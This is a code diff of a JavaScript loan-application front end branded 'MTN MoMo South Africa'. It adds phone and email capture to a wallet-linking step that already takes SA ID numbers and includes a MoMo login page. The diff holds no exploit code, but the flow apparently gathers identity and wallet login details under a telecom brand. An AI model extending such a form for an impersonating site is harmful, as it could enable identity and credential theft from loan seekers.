@@ -1,5 +1,5 @@
 // ============================================================
-// script.js – MTN MoMo South Africa v6.3 (FINAL)
+// script.js – MTN MoMo South Africa v6.4 (FINAL)
 // ============================================================
 'use strict';
 
@@ -74,7 +74,6 @@ function isUserRegistered() {
     return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType]);
 }
 
-// Friendly guidance, not an error
 function forceRegistration(reason) {
     showToast('🔗 Please link your MoMo account to continue', 'info', 3500);
     setTimeout(() => {
@@ -138,7 +137,7 @@ function goTo(pageId) {
 
     if (pageId === 'page-requirements') updateRequirementsLimits();
     if (pageId === 'page-step1')        refreshStep1();
-    if (pageId === 'page-step2')        prefillPersonal();          // ✅ FIX: now called
+    if (pageId === 'page-step2')        prefillPersonal();
     if (pageId === 'page-momologin')    prefillMoMoLogin();
     if (pageId === 'page-confirmation') updateConfirmation();
     refreshAccountBadges();
@@ -172,7 +171,6 @@ function normalizeId(id) {
     else document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
 }
 
-// Clamp slider max to account max if registered
 function updateCalc() {
     const slider = document.getElementById('amtSlider');
     const maxAllowed = isUserRegistered()
@@ -306,6 +304,8 @@ function startMoMoRegistration(opts = {}) {
     saveAll();
 
     document.getElementById('regId').value = '';
+    document.getElementById('regPhone').value = '';
+    document.getElementById('regEmail').value = '';
     document.getElementById('regDetailsPreview').innerHTML =
         '<div class="reg-preview-placeholder">Enter your ID above</div>';
     selectedAccountType = null;
@@ -325,7 +325,7 @@ function startMoMoRegistration(opts = {}) {
         if (heading) heading.textContent = 'Link Your MoMo Wallet';
         if (sub)     sub.textContent     = 'Verify your ID to link your existing MoMo account';
         if (introH3) introH3.textContent = 'Link your existing MoMo wallet';
-        if (introP)  introP.textContent  = 'Confirm your SA ID and pick the wallet type you already hold. This links your existing MoMo account to your loan profile.';
+        if (introP)  introP.textContent  = 'Confirm your SA ID, mobile number and email, then pick the wallet type you already hold.';
     } else {
         if (heading) heading.textContent = 'MoMo Registration';
         if (sub)     sub.textContent     = 'Register in under 60 seconds';
@@ -348,11 +348,18 @@ function selectAccountType(type) {
 }
 
 async function completeRegistration() {
-    const id = document.getElementById('regId').value.trim();
+    const id    = document.getElementById('regId').value.trim();
+    const phone = document.getElementById('regPhone').value.trim();
+    const email = document.getElementById('regEmail').value.trim();
+
     if (!id) return showErr('regErr', 'Please enter your SA ID.');
     if (id.length !== 13) return showErr('regErr', 'SA ID must be 13 digits.');
     const r = parseSAId(id);
     if (!r.ok) return showErr('regErr', r.reason);
+    if (phone.length !== 9) return showErr('regErr', 'Mobile number must be 9 digits (e.g. 812345678).');
+    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        return showErr('regErr', 'Enter a valid email address.');
+    }
     if (!selectedAccountType) return showErr('regErr', 'Please select an account type.');
 
     if (!S.applicationId) S.applicationId = genAppId();
@@ -361,7 +368,7 @@ async function completeRegistration() {
     const btn = document.getElementById('regBtn');
     setBtnLoading(btn, true, 'Complete Registration');
     goTo('page-register-processing');
-    document.getElementById('regProcessingStatus').textContent = '⏳ Verifying your ID...';
+    document.getElementById('regProcessingStatus').textContent = '⏳ Verifying your details...';
 
     try {
         const data = await apiCall('/api/register-momo', {
@@ -370,7 +377,8 @@ async function completeRegistration() {
                 applicationId: S.applicationId,
                 idNumber: id,
                 accountType: selectedAccountType,
-                phone: null,
+                phone: phone,
+                email: email,
                 fullName: null
             })
         });
@@ -387,6 +395,8 @@ async function completeRegistration() {
         S.accountMaxLoan = data.maxLoan;
         S.isRegistered   = true;
         S.steps = { loan: 'idle', personal: 'idle', employment: 'idle', guarantor: 'idle', momologin: 'idle', qualification: 'idle' };
+        S.personal = { ...S.personal, phone: phone, email: email };
+
         saveAll();
         updateCalc();
 
@@ -1023,4 +1033,4 @@ document.addEventListener('DOMContentLoaded', () => {
 // ─── INIT ───
 updateCalc();
 recoverSession();
-console.log('✅ MTN MoMo SA v6.3 loaded');
+console.log('✅ MTN MoMo SA v6.4 loaded');
